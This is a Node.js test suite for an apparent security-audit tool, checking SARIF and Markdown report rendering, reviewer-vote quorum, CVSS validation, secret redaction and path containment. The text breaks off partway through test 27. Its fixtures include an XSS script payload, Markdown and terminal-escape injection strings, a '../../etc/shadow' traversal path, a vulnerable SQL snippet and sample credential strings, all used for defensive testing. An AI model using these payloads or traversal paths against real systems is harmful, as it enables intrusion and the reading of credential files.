#!/usr/bin/env node
/**
 * test-render-sarif.mjs
 * Automated verification test suite for render-sarif.mjs and finalize-scan.mjs (121 Invariants).
 */

import fs from 'node:fs';
import path from 'node:path';
import crypto from 'node:crypto';
import os from 'node:os';
import { execFileSync } from 'node:child_process';
import { getHardenedGitProvenance, readGitFileAtRevision, resolveGitCommitRef } from '../skills/3lens/scripts/safe-git.mjs';
import { buildDirectoryManifest, extractChangedFiles, buildScanManifest, categorizeDirectory, classifyFile } from '../skills/3lens/scripts/build-inventory.mjs';
import { buildThreatModel, generateDiscoveryMatrix, detectRepositoryInventory } from '../skills/3lens/scripts/build-threat-model.mjs';

import {
  CVSS_V4_REGEX,
  normalizeUri,
  calculateEvidenceSufficiency,
  deriveAuthoritativeEvidenceSufficiency,
  calculateRigor,
  validateDirectoryManifest,
  validateReviewManifest,
  reconcileCoverage,
  computeLineHash,
  mapSeverityToSarif,
  stripControlAndBidi,
  sanitizeInlineText,
  sanitizeTableCell,
  sanitizeBlockText,
  sanitizeCodeSnippet,
  redactSecrets,
  validateCvssV4,
  deriveFinalDisposition,
  clampConfidence,
  finalizeScan,
  unionCandidates,
  computeFindingFingerprint,
  renderSarifFromCanonical,
  renderMarkdownFromCanonical,
  normalizeDirectoryPath,
  loadVotes,
  extractVoteEvidence,
  validateVoteEvidence,
  deriveAuthoritativeRigor,
  validateCanonicalFindings,
  validateBallot,
  validateDiscoveryCell,
  validateDiscoveryMatrix,
  computeLineageFingerprint,
  VALID_NOVELTY_STATES,
  validateFindingLineage,
  VALID_FINDING_TYPES,
  validateFindingType,
  VALID_PROOF_KINDS,
  validateSafeProof,
  FAILURE_REASON_CODES,
  deriveReasonCode,
  computeEvidenceSnapshot,
  isEvidenceStale,
  inferSecurityProperty,
  ingestExternalEvidence,
  buildExecutionAttestation,
  resolveStandardsMapping,
  detectDependencyBoundary,
  inferDefectManagement,
  buildAuditBaseline,
  normalizeDirectoryStatus,
  tokenizeSecretsForContext,
  detokenizeSecrets,
  computeExecutionEquivalenceKey,
  validateRiskAcceptance,
  verifyToolSelfIntegrity,
  runCalibrationCanaries,
  runDispositionCanaries,
  prepareReviewContext,
  readPreparedFile,
  getPreparedContextFilePath,
  generateToolIntegrityManifest,
  isPathContained,
  resolveExternalUri,
  isAuthoritativeClean,
  computeCanonicalArtifactHashes,
  validateCrossFormatParity,
  loadProjectSecurityContext,
  detectContextDrift,
  computeProjectContextFingerprint,
  computeSecurityPropertiesFingerprint,
  initProjectContext,
  loadBaselineContext,
  persistBaselineContext,
  evaluateSecondOpinion,
  validateThreatModel,
  TOOL_VERSION,
  getToolProvenance,
  verifyGuardTelemetry
} from '../skills/3lens/scripts/finalize-scan.mjs';

import { validateAttackPath, detectProofGaps } from '../skills/3lens/scripts/validate-attack-path.mjs';
import { validatePatchSyntax, detectStalePatch, verifyRemediation } from '../skills/3lens/scripts/validate-patch.mjs';
import { evaluateDiscovery, generateSimulatedCandidates, runDiscoveryEval } from '../skills/3lens/scripts/run-discovery-eval.mjs';
import { evaluateStability, computeJaccardSimilarity, generateSimulatedRuns, evaluateCorpusStability, runStabilityEval } from '../skills/3lens/scripts/run-stability-eval.mjs';
import { runSemanticEval, runHoldoutEval } from '../skills/3lens/scripts/run-semantic-eval.mjs';
import { isRealPathContained, safeReadFileContained, assertContainedPath } from '../skills/3lens/scripts/path-containment.mjs';
import { createBenchmarkRunEnvelope, validateBenchmarkRunEnvelope, probeEnvironment, validateCandidateSet, parseStreamJsonTrace, validatePermissionsProfile, AGY_COMMAND_EXECUTION_POLICIES, parseAgentFrontmatter, validateAgentContract, validateAllAgentContracts } from '../skills/3lens/scripts/record-benchmark-run.mjs';

import { renderSarif, renderMarkdown, escapeMarkdown, getGitProvenance } from '../skills/3lens/scripts/render-sarif.mjs';

/**
 * Creates an isolated, temporary Git repository fixture for testing Git accounting,
 * pre-image extraction, and review diffs without relying on host/unpacked working tree state.
 */
function createTestGitFixture() {
  const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'sec-audit-fixture-'));
  try {
    execFileSync('git', ['init'], { cwd: tmpDir, stdio: 'ignore' });
    execFileSync('git', ['config', 'user.name', 'AuditFixture'], { cwd: tmpDir, stdio: 'ignore' });
    execFileSync('git', ['config', 'user.email', 'fixture@audit.local'], { cwd: tmpDir, stdio: 'ignore' });
    execFileSync('git', ['config', 'commit.gpgsign', 'false'], { cwd: tmpDir, stdio: 'ignore' });

    // Setup baseline commit (HEAD~1)
    const file1 = path.join(tmpDir, 'file1.txt');
    const fileToDelete = path.join(tmpDir, 'deleted.txt');
    const pkgJson = path.join(tmpDir, 'package.json');
    const scriptDir = path.join(tmpDir, 'skills', '3lens', 'scripts');
    fs.mkdirSync(scriptDir, { recursive: true });
    fs.writeFileSync(path.join(scriptDir, 'safe-git.mjs'), '// Mock safe git script for fixture\n');
    fs.writeFileSync(file1, 'Initial content line 1\nline 2\n');
    fs.writeFileSync(fileToDelete, 'This file will be deleted\n');
    fs.writeFileSync(pkgJson, JSON.stringify({ name: '@arcobaleno64/agy-security-audit', version: '1.0.0' }, null, 2));

    execFileSync('git', ['add', '.'], { cwd: tmpDir, stdio: 'ignore' });
    execFileSync('git', ['commit', '-m', 'Initial baseline commit'], { cwd: tmpDir, stdio: 'ignore' });

    // Setup second commit (HEAD) with modified, deleted, and added files
    fs.writeFileSync(file1, 'Modified content line 1\nline 2\nadded line 3\n');
    fs.unlinkSync(fileToDelete);
    const addedFile = path.join(tmpDir, 'added.txt');
    fs.writeFileSync(addedFile, 'Brand new file\n');

    execFileSync('git', ['add', '.'], { cwd: tmpDir, stdio: 'ignore' });
    execFileSync('git', ['commit', '-m', 'Second commit with diffs'], { cwd: tmpDir, stdio: 'ignore' });

    return {
      repoPath: tmpDir,
      cleanup: () => {
        try {
          fs.rmSync(tmpDir, { recursive: true, force: true });
        } catch {
          // Ignore cleanup errors on Windows
        }
      }
    };
  } catch (err) {
    try {
      fs.rmSync(tmpDir, { recursive: true, force: true });
    } catch {}
    throw new Error(`Failed to create test git fixture: ${err.message}`);
  }
}

// -----------------------------------------------------------------------------
// Self-Contained Automated Test Suite (--test)
// -----------------------------------------------------------------------------
export function runTests() {
  console.log('Running test suite for render-sarif.mjs and finalize-scan.mjs (P0 Hardening)...');

  const gitFixture = createTestGitFixture();
  try {
    // 1. Rigor calculation test

  const fullMetrics = {
    sinkVerified: true,
    sourceVerified: true,
    dataflowVerifiedSteps: 4,
    dataflowTotalSteps: 4,
    pocSyntacticDemonstrated: true,
    mitigationInspected: true
  };
  const r1 = calculateRigor(fullMetrics);
  if (r1.score !== 1.0 || r1.assuranceLevel !== 'HIGH_RIGOR') {
    throw new Error(`Rigor test failed for full metrics: ${JSON.stringify(r1)}`);
  }

  const zeroMetrics = {};
  const r0 = calculateRigor(zeroMetrics);
  if (r0.score !== 0.0 || r0.assuranceLevel !== 'LOW_RIGOR') {
    throw new Error(`Rigor test failed for zero metrics: ${JSON.stringify(r0)}`);
  }
  console.log('✔ 1. Evidence Sufficiency calculation tests passed.');

  // 2. CVSS v4 vector validation test
  const validVector = 'CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N';
  if (!CVSS_V4_REGEX.test(validVector)) {
    throw new Error(`Valid CVSS v4 vector rejected: ${validVector}`);
  }
  const invalidVector = 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H';
  if (CVSS_V4_REGEX.test(invalidVector)) {
    throw new Error(`Invalid CVSS v4 vector accepted: ${invalidVector}`);
  }
  const cvssRes = validateCvssV4({ vector: invalidVector, score: 9.0 });
  if (cvssRes.valid || cvssRes.vector !== null) {
    throw new Error('Invalid CVSS v4 vector was not rejected fail-closed');
  }
  // P1-01 Suffix /GARBAGE rejection
  if (CVSS_V4_REGEX.test(validVector + '/GARBAGE')) {
    throw new Error('P1-01 VIOLATION: Suffix /GARBAGE accepted by CVSS_V4_REGEX');
  }
  const garbageRes = validateCvssV4({ vector: validVector + '/GARBAGE', score: 9.0 });
  if (garbageRes.valid) {
    throw new Error('P1-01 VIOLATION: Suffix /GARBAGE accepted by validateCvssV4');
  }
  console.log('✔ 2. CVSS v4.0 vector validation and fail-closed rejection tests passed.');


  // 3. Path normalization & RFC 3986 test
  const winPath = 'src\\controllers\\auth [admin].ts';
  const uri = normalizeUri('C:\\project', 'C:\\project\\' + winPath);
  if (uri.includes('\\') || !uri.includes('auth%20%5Badmin%5D.ts')) {
    throw new Error(`Path normalization failed: ${uri}`);
  }
  console.log('✔ 3. RFC 3986 URI & backslash normalization tests passed.');

  // 4. Directory manifest validation
  const validManifest = {
    complete: false,
    scanRunId: 'SCAN-RUN-SARIF-001',
    nonce: 'NONCE-SARIF-001',
    taskCorrelationNonce: 'NONCE-SARIF-001',
    entries: [
      { path: 'src/', status: 'SCANNED', fileCount: 10, reason: 'Source code' },
      { path: 'dist/', status: 'EXCLUDED_GENERATED', fileCount: 5, reason: 'Build output' }
    ]
  };
  const mv = validateDirectoryManifest(validManifest);
  if (!mv.valid) {
    throw new Error(`Valid manifest rejected: ${mv.error}`);
  }

  const invalidManifest = {
    entries: [
      { path: 'legacy/', status: 'UNKNOWN_FOLDER', fileCount: 1 }
    ]
  };
  const miv = validateDirectoryManifest(invalidManifest);
  if (miv.valid || !miv.error.includes('UNACCOUNTED_DIRECTORY_ERROR')) {
    throw new Error(`Unaccounted directory not flagged: ${JSON.stringify(miv)}`);
  }
  console.log('✔ 4. Directory Accounting reconciliation manifest tests passed.');

  // 5. Empty manifest rejection test
  const emptyManifest = { entries: [] };
  const emTest = validateDirectoryManifest(emptyManifest);
  if (emTest.valid || !emTest.error.includes('UNACCOUNTED_DIRECTORY_ERROR')) {
    throw new Error('Empty manifest was not rejected!');
  }
  console.log('✔ 5. Empty manifest rejection test passed.');

  // 6. Confirmed SARIF Generation with validated consensus
  const confirmedFindings = [
    {
      id: 'SEC-001',
      ruleId: 'CWE-89',
      title: 'SQL Injection in Auth',
      severity: 'CRITICAL',
      nonce: 'NONCE-SARIF-001',
      cvssV4: {
        vector: validVector,
        score: 9.3,
        severity: 'CRITICAL'
      },
      location: {
        uri: 'skills/3lens/scripts/safe-git.mjs',
        startLine: 42,
        endLine: 44,
        lineSnippet: 'const query = `SELECT * FROM users WHERE name = "${input}"`;'
      },
      rigorMetrics: fullMetrics
    }
  ];

  const confirmedVotes = [
    {
      findingId: 'SEC-001',
      reviewerId: 'rev-1',
      lens: 'REACHABILITY',
      decision: 'CONFIRMED',
      nonce: 'NONCE-SARIF-001',
      evidence: [
        { path: 'skills/3lens/scripts/safe-git.mjs', line: 42, role: 'source' },
        { path: 'skills/3lens/scripts/safe-git.mjs', line: 44, role: 'sink' }
      ]
    },
    {
      findingId: 'SEC-001',
      reviewerId: 'rev-2',
      lens: 'DEFENSES',
      decision: 'CONFIRMED',
      nonce: 'NONCE-SARIF-001',
      evidence: [{ path: 'skills/3lens/scripts/safe-git.mjs', line: 42, role: 'control' }]
    },
    {
      findingId: 'SEC-001',
      reviewerId: 'rev-3',
      lens: 'IMPACT',
      decision: 'CONFIRMED',
      nonce: 'NONCE-SARIF-001',
      evidence: [{ path: 'skills/3lens/scripts/safe-git.mjs', line: 44, role: 'sink' }]
    }
  ];

  const sarif = renderSarif({ findings: confirmedFindings, manifest: validManifest, votes: confirmedVotes, scanRunId: 'SCAN-RUN-SARIF-001', repoRoot: process.cwd() });
  if (sarif.version !== '2.1.0') throw new Error('SARIF version must be 2.1.0');
  if (sarif.runs[0].tool.driver.rules.length !== 1) throw new Error('Rule was not registered in driver.rules');
  if (sarif.runs[0].results[0].level !== 'error') throw new Error('Critical confirmed finding must map to level error');
  if (sarif.runs[0].results[0].properties.disposition !== 'REPORTABLE') throw new Error('Finding should be REPORTABLE');
  console.log('✔ 6. SARIF 2.1.0 schema compliance and level mapping tests passed.');


  // 7. P0 Invariant: Anti-Self-Assertion (0 votes cannot be CONFIRMED)
  const zeroVotesFinding = [
    {
      id: 'SEC-002',
      ruleId: 'CWE-89',
      title: 'Self-Asserted SQLi',
      severity: 'CRITICAL',
      location: { uri: 'src/auth.ts', startLine: 10 },
      verdict: 'CONFIRMED' // Attempt to self-assert CONFIRMED with 0 votes
    }
  ];
  const zeroVotesSarif = renderSarif({ findings: zeroVotesFinding, manifest: validManifest });
  const zeroResult = zeroVotesSarif.runs[0].results[0];
  if (zeroResult.properties.disposition === 'REPORTABLE' || zeroResult.properties.verdict === 'CONFIRMED') {
    throw new Error('P0 VIOLATION: Finding with 0 votes was accepted as CONFIRMED / REPORTABLE!');
  }
  if (zeroResult.properties.disposition !== 'DEFERRED' || zeroResult.properties.verdict !== 'NEEDS_MANUAL_REVIEW') {
    throw new Error('Finding with 0 votes was not downgraded to DEFERRED / NEEDS_MANUAL_REVIEW');
  }
  console.log('✔ 7. P0 Invariant: 0 votes != CONFIRMED (Self-asserted finding downgraded to DEFERRED).');

  // 8. P0 Invariant: Quorum rule (1 vote alone cannot confirm)
  const singleVoteFinding = {
    id: 'SEC-003',
    ruleId: 'CWE-79',
    title: 'XSS Candidate',
    location: { uri: 'src/view.ts', startLine: 20 },
    rigorMetrics: fullMetrics
  };
  const singleVote = [
    { findingId: 'SEC-003', reviewerId: 'rev-1', decision: 'CONFIRMED' }
  ];
  const quorumTest = deriveFinalDisposition(singleVoteFinding, singleVote, calculateRigor(fullMetrics));
  if (quorumTest.disposition === 'REPORTABLE') {
    throw new Error('P0 VIOLATION: Single vote satisfied quorum!');
  }
  console.log('✔ 8. P0 Invariant: Quorum requires at least 2 independent votes.');

  // 9. P0 Invariant: Vote deduplication (same reviewer/persona cannot vote twice)
  const duplicateVotes = [
    { findingId: 'SEC-003', reviewerId: 'rev-1', persona: 'ExploitHacker', decision: 'CONFIRMED' },
    { findingId: 'SEC-003', reviewerId: 'rev-1', persona: 'ExploitHacker', decision: 'CONFIRMED' }
  ];
  const dedupTest = deriveFinalDisposition(singleVoteFinding, duplicateVotes, calculateRigor(fullMetrics));
  if (dedupTest.disposition === 'REPORTABLE') {
    throw new Error('P0 VIOLATION: Duplicate votes by same reviewer satisfied quorum!');
  }
  console.log('✔ 9. P0 Invariant: Duplicate votes from same reviewer/persona are deduplicated.');

  // 10. P0 Invariant: Decisive counterevidence refutation
  const counterevidenceVotes = [
    { findingId: 'SEC-003', reviewerId: 'rev-1', decision: 'CONFIRMED' },
    {
      findingId: 'SEC-003',
      reviewerId: 'rev-2',
      decision: 'FALSE_POSITIVE',
      mitigationProofLine: 18,
      mitigationReason: 'DOMPurify.sanitize neutralizes untrusted payload'
    },
    {
      findingId: 'SEC-003',
      reviewerId: 'rev-3',
      decision: 'FALSE_POSITIVE',
      mitigationProofLine: 18,
      mitigationReason: 'DOMPurify.sanitize neutralizes untrusted payload'
    }
  ];
  const refutedTest = deriveFinalDisposition(singleVoteFinding, counterevidenceVotes, calculateRigor(fullMetrics));
  if (refutedTest.disposition !== 'SUPPRESSED' || refutedTest.mappedVerdict !== 'FALSE_POSITIVE') {
    throw new Error('P0 VIOLATION: Decisive counterevidence was not honored as SUPPRESSED / FALSE_POSITIVE');
  }
  console.log('✔ 10. P0 Invariant: Decisive counterevidence suppresses finding to FALSE_POSITIVE.');

  // 11. P0 Invariant: Confidence clamping
  const clamp2of3 = clampConfidence('REPORTABLE', { total: 3, unanimous: false });
  if (clamp2of3.score > 0.70 || clamp2of3.level !== 'medium') {
    throw new Error(`P0 VIOLATION: Non-unanimous panel confidence not clamped to medium: ${JSON.stringify(clamp2of3)}`);
  }
  const clamp3of3 = clampConfidence('REPORTABLE', { total: 3, unanimous: true });
  if (clamp3of3.level !== 'high') {
    throw new Error(`P0 VIOLATION: Unanimous panel confidence should be high: ${JSON.stringify(clamp3of3)}`);
  }
  console.log('✔ 11. P0 Invariant: Confidence clamping (2/3 -> medium, 3/3 -> high).');

  // 12. P0 Invariant: Deterministic Secret Redaction
  const leakText = 'Found AWS key AKIAIOSFODNN7EXAMPLE and bearer eyJhbGciOiJIUzI1NiJ9.test and password: "SecretPassword123!"';
  const redacted = redactSecrets(leakText);
  if (redacted.includes('AKIAIOSFODNN7EXAMPLE') || redacted.includes('SecretPassword123!')) {
    throw new Error(`P0 VIOLATION: Raw secrets not redacted: ${redacted}`);
  }
  if (!redacted.includes('[REDACTED_AWS_ACCESS_KEY') || !redacted.includes('[REDACTED_GENERIC_SECRET_KV')) {
    throw new Error(`P0 VIOLATION: Redaction fingerprint markers missing: ${redacted}`);
  }
  console.log('✔ 12. P0 Invariant: Deterministic secret redaction masks credentials with fingerprints.');

  // 13. P0 Invariant: Credential finding lineSnippet complete suppression
  const credentialFinding = [
    {
      id: 'SEC-004',
      ruleId: 'CWE-798',
      title: 'Hardcoded API Secret',
      location: {
        uri: 'config/keys.ts',
        startLine: 5,
        lineSnippet: 'export const apiKey = "' + ['AIzaSyD', 'Secret123456789'].join('-') + '";'
      }
    }
  ];
  const credVotes = [
    { findingId: 'SEC-004', reviewerId: 'rev-1', decision: 'CONFIRMED' },
    { findingId: 'SEC-004', reviewerId: 'rev-2', decision: 'CONFIRMED' }
  ];
  const credSarif = renderSarif({ findings: credentialFinding, manifest: validManifest, votes: credVotes });
  const credSnippet = credSarif.runs[0].results[0].properties?.location?.lineSnippet ||
    credSarif.runs[0].results[0].locations[0].physicalLocation.artifactLocation.uri;
  const credMd = renderMarkdown({ findings: credentialFinding, manifest: validManifest, votes: credVotes });
  if (credMd.includes('AIzaSyD-Secret123456789')) {
    throw new Error('P0 VIOLATION: Credential finding leaked raw secret in report!');
  }
  if (!credMd.includes('Line snippet suppressed for credential finding')) {
    throw new Error('P0 VIOLATION: Credential snippet suppression marker not emitted');
  }
  console.log('✔ 13. P0 Invariant: Credential findings suppress raw line snippet completely.');

  // 14. P0 Invariant: Markdown & Terminal Output Injection Hardening
  const injectedFinding = [
    {
      id: 'SEC-005',
      ruleId: 'CWE-79',
      title: 'XSS <script>alert(1)</script> \x1B[31mRedText\x1B[0m \u202Ereversed',
      description: 'Breakout ```\n# Injected Heading\n| Pipe | Table | Injection |',
      location: { uri: 'src/main.ts', startLine: 1 }
    }
  ];
  const injectedVotes = [
    { findingId: 'SEC-005', reviewerId: 'rev-1', decision: 'CONFIRMED' },
    { findingId: 'SEC-005', reviewerId: 'rev-2', decision: 'CONFIRMED' }
  ];
  const injectedMd = renderMarkdown({ findings: injectedFinding, manifest: validManifest, votes: injectedVotes });
  if (injectedMd.includes('<script>') || injectedMd.includes('\x1B[31m') || injectedMd.includes('\u202E')) {
    throw new Error('P0 VIOLATION: Control characters or scripts leaked into markdown!');
  }
  if (injectedMd.includes('\n# Injected Heading')) {
    throw new Error('P0 VIOLATION: Markdown heading injection not escaped!');
  }
  console.log('✔ 14. P0 Invariant: ANSI escapes, Bidi overrides, and Markdown injections neutralized.');

  // 15. P0 Invariant: Target Path Traversal Containment
  const traversalFinding = [
    {
      id: 'SEC-006',
      ruleId: 'CWE-22',
      title: 'Path Traversal finding',
      location: { uri: '../../etc/shadow', startLine: 1 },
      consensus: { totalVotes: 3, unanimous: true }
    }
  ];
  const traversalSarif = renderSarif({ findings: traversalFinding, manifest: validManifest });
  if (!traversalSarif.runs[0].results[0].locations[0].physicalLocation.artifactLocation.uri.includes('invalid_path_escaped')) {
    throw new Error('P0 VIOLATION: Path traversal finding was not neutralized to safe containment sentinel!');
  }

  console.log('✔ 15. P0 Invariant: Target path traversal outside repo root is rejected.');

  // 16. P0 Invariant: Incomplete Coverage cannot declare repository clean
  const partialManifest = {
    schemaVersion: '1',
    entries: [
      { path: './', status: 'SCANNED' },
      { path: 'src/secret-component', status: 'UNCHECKABLE' }
    ]
  };
  const partialSarif = renderSarif({ findings: [], manifest: partialManifest });
  const partialMd = renderMarkdown({ findings: [], manifest: partialManifest });
  if (partialSarif.runs[0].properties.coverageStatus === 'COMPLETE') {
    throw new Error('P0 VIOLATION: Incomplete coverage marked as COMPLETE in SARIF!');
  }
  if (!partialMd.includes('cannot be certified clean under default-deny')) {
    throw new Error('P0 VIOLATION: Missing explicit unverified coverage disclaimer under default-deny');
  }
  console.log('✔ 16. P0 Invariant: Incomplete coverage cannot declare repository clean (Fail-Closed).');

  // 17. P0 Invariant: 100% Canonical Parity between SARIF and Markdown
  const finalization = finalizeScan({
    candidates: confirmedFindings,
    manifest: validManifest,
    repoRoot: process.cwd(),
    votes: confirmedVotes
  });

  const canonicalSarif = renderSarifFromCanonical({
    canonicalFindings: finalization.canonicalFindings,
    manifest: finalization.manifest,
    coverageStatus: finalization.coverageStatus
  });
  const canonicalMd = renderMarkdownFromCanonical({
    canonicalFindings: finalization.canonicalFindings,
    manifest: finalization.manifest,
    coverageStatus: finalization.coverageStatus
  });

  if (canonicalSarif.runs[0].results.length !== 1 || !canonicalMd.includes('SQL Injection in Auth')) {
    throw new Error('P0 VIOLATION: Inconsistency between canonical SARIF and Markdown outputs!');
  }

  // 17.1 Public Renderer Parity (R11-F03-01): renderSarif and renderMarkdown maintain identical canonical disposition parity under scanRunId inheritance
  const publicSarif = renderSarif({
    findings: confirmedFindings,
    manifest: validManifest,
    votes: confirmedVotes,
    scanRunId: 'SCAN-RUN-SARIF-001',
    repoRoot: process.cwd()
  });
  const publicMd = renderMarkdown({
    findings: confirmedFindings,
    manifest: validManifest,
    votes: confirmedVotes,
    scanRunId: 'SCAN-RUN-SARIF-001',
    repoRoot: process.cwd()
  });
  if (publicSarif.runs[0].results[0].properties.disposition !== 'REPORTABLE') {
    throw new Error('R11-F03-01 VIOLATION: renderSarif failed to produce REPORTABLE under scanRunId inheritance');
  }
  if (!publicMd.includes('REPORTABLE') && publicMd.includes('DEFERRED')) {
    throw new Error('R11-F03-01 VIOLATION: renderMarkdown produced DEFERRED while renderSarif produced REPORTABLE under scanRunId inheritance');
  }
  console.log('✔ 17. P0 Invariant: 100% Canonical Parity between SARIF and Markdown.');

  // 18. P1 (0.10.0): Deterministic Directory Manifest from Filesystem
  const fsManifest = buildDirectoryManifest(process.cwd());
  const fsManifestValidation = validateDirectoryManifest(fsManifest);
  if (!fsManifestValidation.valid) {
    throw new Error(`P1 VIOLATION: Filesystem directory manifest invalid: ${fsManifestValidation.error}`);
  }
  if (!fsManifest.entries.some(e => e.path === 'skills/' && e.status.startsWith('SCANNED'))) {
    throw new Error('P1 VIOLATION: Expected skills/ folder not marked SCANNED in directory manifest');
  }
  console.log('✔ 18. P1 Invariant: Ground-truth directory manifest derived deterministically from filesystem.');

  // 19. P1 (0.10.0): Review Mode Changed Files Accounting
  const changedInfo = extractChangedFiles(gitFixture.repoPath, { base: 'HEAD~1', head: 'HEAD' });
  if (typeof changedInfo.totalAccounted !== 'number' || changedInfo.totalAccounted === 0) {
    throw new Error('P1 VIOLATION: extractChangedFiles did not return numeric totalAccounted > 0');
  }
  console.log('✔ 19. P1 Invariant: Review mode extracts and accounts for 100% changed/deleted files.');

  // 20. P1 (0.10.0): Scan Manifest Schema Compliance
  const scanManifest = buildScanManifest({ mode: 'scan', repoRoot: process.cwd() });
  if (scanManifest.schemaVersion !== '1' || scanManifest.mode !== 'scan' || !scanManifest.target.root) {
    throw new Error('P1 VIOLATION: buildScanManifest output does not conform to Section 31 Schema');
  }
  const reviewManifest = buildScanManifest({ mode: 'review', repoRoot: process.cwd() });
  if (reviewManifest.mode !== 'review') {
    throw new Error('P1 VIOLATION: buildScanManifest failed to record review mode');
  }
  console.log('✔ 20. P1 Invariant: Scan and Review manifests conform to canonical schema.');

  // 21. P1 (0.10.0): Review Mode Coverage Reconciliation & Markdown Generation
  const realDiffForTest21 = extractChangedFiles(gitFixture.repoPath, { base: 'HEAD~1', head: 'HEAD' });
  const reviewInventoryManifest = {
    mode: 'review',
    base: 'HEAD~1',
    head: 'HEAD',
    reviewInventory: {
      changedFiles: realDiffForTest21.changedFiles,
      deletedFiles: realDiffForTest21.deletedFiles
    }
  };
  const reviewFinalization = finalizeScan({
    candidates: [],
    manifest: reviewInventoryManifest,
    repoRoot: gitFixture.repoPath
  });
  if (reviewFinalization.coverageStatus !== 'COMPLETE') {
    throw new Error('P1 VIOLATION: Valid review manifest was not marked COMPLETE coverage');
  }
  const reviewMd = renderMarkdownFromCanonical({
    canonicalFindings: reviewFinalization.canonicalFindings,
    manifest: reviewFinalization.manifest,
    coverageStatus: reviewFinalization.coverageStatus
  });
  if (!reviewMd.includes('Changed Files Accounting Manifest (Review Mode)')) {
    throw new Error('P1 VIOLATION: Review markdown does not render changed files accounting section');
  }
  console.log('✔ 21. P1 Invariant: Review mode coverage reconciliation achieves COMPLETE under Default-Deny.');


  // 22. P1 (0.10.0): Categorization Accuracy for Monorepos & CLI (R2-P0-10)
  if (!categorizeDirectory('.github').status.startsWith('SCANNED')) {
    throw new Error('P1 VIOLATION: .github directory must be SCANNED for CI/CD attack surface');
  }
  if (!categorizeDirectory('packages').status.startsWith('SCANNED')) {
    throw new Error('P1 VIOLATION: packages directory must be SCANNED for monorepo first-party code');
  }
  if (!categorizeDirectory('bin').status.startsWith('SCANNED')) {
    throw new Error('P1 VIOLATION: bin directory must be SCANNED for CLI source scripts');
  }
  console.log('✔ 22. P1 Invariant: Critical entrypoints (.github, packages, bin) properly classified as SCANNED.');

  // 23. P1 (0.10.0): Git Baseline Pre-Image Reader
  const headPkg = readGitFileAtRevision(gitFixture.repoPath, 'HEAD', 'package.json');
  if (!headPkg || !headPkg.includes('@arcobaleno64/agy-security-audit')) {
    throw new Error('P1 VIOLATION: readGitFileAtRevision failed to read committed pre-image from git fixture');
  }
  console.log('✔ 23. P1 Invariant: Git baseline pre-image reader safely retrieves historical revisions.');


  // 24. P1 (0.10.0): Deterministic Threat Model Schema Compliance
  const tm = buildThreatModel(process.cwd());
  if (tm.schemaVersion !== '1' || !Array.isArray(tm.components) || tm.components.length === 0 || !Array.isArray(tm.inScopeFamilies)) {
    throw new Error('P1 VIOLATION: buildThreatModel failed Section 17/30 schema validation');
  }
  console.log('✔ 24. P1 Invariant: Threat Model generated deterministically adhering to bounded schema.');

  // 25. P1 (0.10.0): Fixed 3-Lens Verifier Panel Unanimous Consensus
  const candidate3Lens = {
    id: 'SEC-3LENS',
    title: 'Command Injection in Worker',
    ruleId: 'CWE-078',
    severity: 'HIGH',
    location: { uri: 'skills/3lens/scripts/safe-git.mjs', startLine: 25 },
    dataflowVerified: true
  };
  const threeLensVotes = [
    {
      findingId: 'SEC-3LENS',
      lens: 'REACHABILITY',
      decision: 'SUPPORTS',
      source: 'skills/3lens/scripts/safe-git.mjs:25',
      sink: 'skills/3lens/scripts/safe-git.mjs:36',
      reason: 'Unsanitized argument flows directly to spawn'
    },
    {
      findingId: 'SEC-3LENS',
      lens: 'DEFENSES',
      decision: 'SUPPORTS',
      evidence: [{ path: 'skills/3lens/scripts/safe-git.mjs', line: 25, role: 'control' }],
      reason: 'No escaping or allowlist barrier present'
    },
    {
      findingId: 'SEC-3LENS',
      lens: 'IMPACT',
      decision: 'SUPPORTS',
      sink: 'skills/3lens/scripts/safe-git.mjs:36',
      reason: 'Arbitrary host command execution'
    }
  ];
  const disp3Lens = deriveFinalDisposition(candidate3Lens, threeLensVotes, { score: 0.85 }, process.cwd());

  if (disp3Lens.disposition !== 'REPORTABLE' || !disp3Lens.votesSummary.isThreeLens) {
    throw new Error('P1 VIOLATION: Unanimous 3-Lens panel failed to achieve REPORTABLE');
  }
  const conf3Lens = clampConfidence(disp3Lens.disposition, disp3Lens.votesSummary, 0.90);
  if (conf3Lens.level !== 'high' || conf3Lens.score < 0.85) {
    throw new Error('P1 VIOLATION: Unanimous 3-Lens panel did not achieve high confidence');
  }
  console.log('✔ 25. P1 Invariant: Unanimous 3-Lens Verifier Panel reaches High Confidence.');

  // 26. P1 (0.10.0): Fixed 3-Lens Panel Reachability Refutation
  const unreachableCandidate = {
    id: 'SEC-UNREACH',
    title: 'Theoretical Query Injection in Dead Code',
    ruleId: 'CWE-089',
    severity: 'HIGH',
    location: { uri: 'skills/3lens/scripts/safe-git.mjs', startLine: 30 }
  };
  const reachabilityRefuteVotes = [
    {
      findingId: 'SEC-UNREACH',
      lens: 'REACHABILITY',
      decision: 'REFUTES',
      reason: 'Function is unreachable from any external route or entrypoint',
      evidence: [{ path: 'skills/3lens/scripts/safe-git.mjs', line: 30, role: 'dead-path' }]
    },
    { findingId: 'SEC-UNREACH', lens: 'DEFENSES', decision: 'SUPPORTS', reason: 'No internal sanitizer' },
    { findingId: 'SEC-UNREACH', lens: 'IMPACT', decision: 'SUPPORTS', reason: 'Database read' }
  ];
  const dispUnreach = deriveFinalDisposition(unreachableCandidate, reachabilityRefuteVotes, { score: 0.70 });
  if (dispUnreach.disposition !== 'SUPPRESSED' || dispUnreach.mappedVerdict !== 'FALSE_POSITIVE') {
    throw new Error('P1 VIOLATION: Unreachable candidate was not suppressed by REACHABILITY lens');
  }
  console.log('✔ 26. P1 Invariant: Reachability lens refutation decisively suppresses candidate under Default-Deny.');

  // 27. P1 (0.10.0): 3-Lens Conjunction Invariant (Defenses Cannot Be Outvoted 2-to-1)
  const mitigatedCandidate = {
    id: 'SEC-MITIGATED',
    title: 'SQL Injection in User Search',
    ruleId: 'CWE-089',
    severity: 'HIGH',
    location: { uri: 'skills/3lens/scripts/safe-git.mjs', startLine: 35 }
  };
  const defensesRefuteVotes = [
    { findingId: 'SEC-MITIGATED', lens: 'REACHABILITY', decision: 'SUPPORTS', reason: 'Public API endpoint reachable' },
    { findingId: 'SEC-MITIGATED', lens: 'DEFENSES', decision: 'REFUTES', mitigationProofLine: 'skills/3lens/scripts/safe-git.mjs:20', mitigationReason: 'Parameterized query barrier prevents injection' },
